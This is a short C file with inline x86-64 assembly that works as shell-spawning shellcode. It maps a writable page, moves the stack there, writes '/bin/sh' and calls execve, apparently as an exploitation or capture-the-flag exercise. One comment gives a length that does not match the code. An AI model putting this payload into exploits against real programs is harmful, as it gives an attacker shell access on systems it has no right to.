void _start() {
    asm volatile (
        // some memory for /bin/sh
        "xor rdi, rdi;" // addr = 0
        "mov rsi, 0x1000;" // len = 0x20
        "mov rdx, 3;" // prot = READ | WRITE
        "mov r10, 0x22;" // flags = ANONymous | PRIVATE
        "mov r8, -1;" // fd = invalid
        "mov r9, 0;" // off = 0
        "mov rax, 9;" // mmap
        "syscall;"

        "mov rsp, rax;" // rsp -> read write mapping

        "mov rdi, 0x68732f6e69622f;"
        "mov [rsp], rdi;" // '/bin/sh\x00' at rsp
        "mov rdi, rsp;" // rdi = filename = /bin/sh
        "xor rsi, rsi;" // # rsi = argv = NULL
        "xor rdx, rdx;" // # rdx = envp = NULL
        "mov rax, 59;" // rax = syscal_no = 59
        "syscall;"
    );
}
